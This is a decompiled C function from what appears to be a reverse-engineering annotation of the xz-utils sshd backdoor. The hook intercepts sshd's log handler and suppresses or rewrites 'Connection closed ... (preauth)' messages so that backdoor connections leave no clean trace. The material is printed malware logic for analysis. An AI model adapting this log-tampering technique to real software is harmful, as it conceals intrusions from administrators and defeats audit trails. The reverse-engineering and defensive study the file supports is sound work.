// /home/kali/xzre-ghidra/xzregh/10A3A0_mm_log_handler_hook.c
// Function: mm_log_handler_hook @ 0x10A3A0
// Calling convention: unknown
// Prototype: undefined mm_log_handler_hook(void)


/*
 * AutoDoc: Interposes on sshd's log handler, ignoring every message when logging is globally disabled or
 * selectively rewriting the 'Connection closed by ... (preauth)' lines when filtering mode is
 * enabled. It rebuilds safe format strings on the stack, calls sshd_log() to emit the sanitised
 * message, and leaves syslog alone unless the caller requested suppression via cmd flags.
 */
#include "xzre_types.h"


void mm_log_handler_hook(undefined4 param_1,undefined8 param_2,ulong param_3)

{
  ulong uVar1;
  int *piVar2;
  long lVar3;
  int iVar4;
  long lVar5;
  long lVar6;
  long lVar7;
  ulong uVar8;
  undefined1 *puVar9;
  undefined4 *puVar10;
  undefined8 *puVar11;
  undefined1 *puVar12;
  undefined1 *puVar13;
  ulong uVar14;
  ulong uVar15;
  byte bVar16;
  char rewritten_msg [320];
  undefined8 local_438;
  undefined8 uStack_430;
  undefined4 local_428 [60];
  undefined8 local_338;
  undefined8 uStack_330;
  undefined4 local_328 [60];
  undefined8 local_238 [2];
  undefined4 local_228;
  undefined1 local_223 [14];
  undefined1 local_215;
  undefined1 local_214 [4];
  undefined1 local_210;
  undefined1 local_20f;
  undefined1 local_20e;
  undefined1 local_20d;
  undefined1 local_20c;
  undefined1 local_20b;
  undefined2 local_20a;
  undefined1 local_208 [7];
  undefined1 local_201;
  
  bVar16 = 0;
  piVar2 = *(int **)(global_ctx + 0x30);
  lVar3 = *(long *)(global_ctx + 0x10);
  local_438 = 0;
  uStack_430 = 0;
  puVar10 = local_428;
  for (lVar7 = 0x3c; lVar7 != 0; lVar7 = lVar7 + -1) {
    *puVar10 = 0;
    puVar10 = puVar10 + 1;
  }
  local_338 = 0;
  uStack_330 = 0;
  puVar10 = local_328;
  for (lVar7 = 0x3c; lVar7 != 0; lVar7 = lVar7 + -1) {
    *puVar10 = 0;
    puVar10 = puVar10 + 1;
  }
  local_238[0] = 0;
  local_238[1] = 0;
  puVar10 = &local_228;
  for (lVar7 = 0x7c; lVar7 != 0; lVar7 = lVar7 + -1) {
    *puVar10 = 0;
    puVar10 = puVar10 + 1;
  }
  if (param_3 != 0) {
    if (*piVar2 == 1) {
      return;
    }
    if (*(int *)(global_ctx + 0x90) != 0) {
      return;
    }
    if ((*(long *)(piVar2 + 0x12) != 0) && (*(long *)(piVar2 + 0x14) == 0)) {
      return;
    }
    lVar7 = c_strlen(param_3);
    uVar1 = param_3 + lVar7;
    while( TRUE ) {
      if (uVar1 <= param_3) {
        return;
      }
      iVar4 = get_string_id(param_3,uVar1);
      if (iVar4 == 0x790) break;
      if ((iVar4 == 0x870) || (iVar4 == 0x1a0)) {
        puVar13 = (undefined1 *)(param_3 + 0x17);
        if (iVar4 == 0x870) {
          puVar13 = (undefined1 *)(param_3 + 0x16);
        }
        uVar14 = 0;
        puVar12 = (undefined1 *)0x0;
        uVar15 = 0;
        goto LAB_0010a504;
      }
      param_3 = param_3 + 1;
    }
    local_238[0] = CONCAT62(local_238[0]._2_6_,**(undefined2 **)(piVar2 + 4));
    *piVar2 = 1;
    if (((piVar2[2] != 0) && (lVar3 != 0)) && (*(code **)(lVar3 + 0x58) != (code *)0x0)) {
      (**(code **)(lVar3 + 0x58))(0xff);
    }
    sshd_log(piVar2,param_1,local_238,param_3);
    iVar4 = piVar2[2];
    goto joined_r0x0010a4c2;
  }
  goto LAB_0010a6da;
LAB_0010a504:
  do {
    iVar4 = get_string_id(param_3,uVar1);
    if (iVar4 == 0x678) {
      if (puVar12 != (undefined1 *)0x0) {
        uVar14 = param_3 - (long)puVar12;
        uVar8 = uVar14;
        puVar9 = puVar12;
        puVar11 = &local_438;
        if (0xff < uVar14) goto LAB_0010a6da;
        for (; uVar8 != 0; uVar8 = uVar8 - 1) {
          *(undefined1 *)puVar11 = *puVar9;
          puVar9 = puVar9 + (ulong)bVar16 * -2 + 1;
          puVar11 = (undefined8 *)((long)puVar11 + (ulong)bVar16 * -2 + 1);
        }
      }
    }
    else if (iVar4 == 0x810) {
      uVar15 = param_3 - (long)puVar13;
      if (0xff < uVar15) goto LAB_0010a6da;
      puVar12 = (undefined1 *)(param_3 + 6);
      puVar9 = puVar13;
      puVar11 = &local_338;
      for (uVar8 = uVar15; uVar8 != 0; uVar8 = uVar8 - 1) {
        *(undefined1 *)puVar11 = *puVar9;
        puVar9 = puVar9 + (ulong)bVar16 * -2 + 1;
        puVar11 = (undefined8 *)((long)puVar11 + (ulong)bVar16 * -2 + 1);
      }
    }
    param_3 = param_3 + 1;
  } while (param_3 < uVar1);
  if ((uVar15 != 0) && (uVar14 != 0)) {
    lVar7 = *(long *)(piVar2 + 6);
    lVar6 = 0;
    do {
      lVar5 = lVar6 + 1;
      *(undefined1 *)(lVar6 + (long)local_238) = *(undefined1 *)(lVar7 + lVar6);
      lVar6 = lVar5;
    } while (lVar5 != 0x15);
    lVar7 = *(long *)(piVar2 + 10);
    lVar6 = 0;
    do {
      local_223[lVar6] = *(undefined1 *)(lVar7 + lVar6);
      lVar6 = lVar6 + 1;
    } while (lVar6 != 0xe);
    local_215 = 0x20;
    lVar7 = *(long *)(piVar2 + 0xc);
    lVar6 = 0;
    do {
      local_214[lVar6] = *(undefined1 *)(lVar7 + lVar6);
      lVar6 = lVar6 + 1;
    } while (lVar6 != 4);
    local_210 = 0x20;
    local_20f = **(undefined1 **)(piVar2 + 4);
    local_20e = (*(undefined1 **)(piVar2 + 4))[1];
    local_20d = 0x20;
    local_20c = **(undefined1 **)(piVar2 + 4);
    local_20b = (*(undefined1 **)(piVar2 + 4))[1];
    local_20a = 0x5b20;
    lVar7 = *(long *)(piVar2 + 8);
    lVar6 = 0;
    do {
      local_208[lVar6] = *(undefined1 *)(lVar7 + lVar6);
      lVar6 = lVar6 + 1;
    } while (lVar6 != 7);
    local_201 = 0x5d;
    *piVar2 = 1;
    if (((piVar2[2] != 0) && (lVar3 != 0)) && (*(code **)(lVar3 + 0x58) != (code *)0x0)) {
      (**(code **)(lVar3 + 0x58))(0xff);
    }
    sshd_log(piVar2,3,local_238,&local_338,&local_438);
    iVar4 = piVar2[2];
joined_r0x0010a4c2:
    if (iVar4 == 0) {
      return;
    }
    if (lVar3 == 0) {
      return;
    }
    if (*(code **)(lVar3 + 0x58) == (code *)0x0) {
      return;
    }
    (**(code **)(lVar3 + 0x58))(0x80000000);
    return;
  }
LAB_0010a6da:
  *piVar2 = 1;
  return;
}

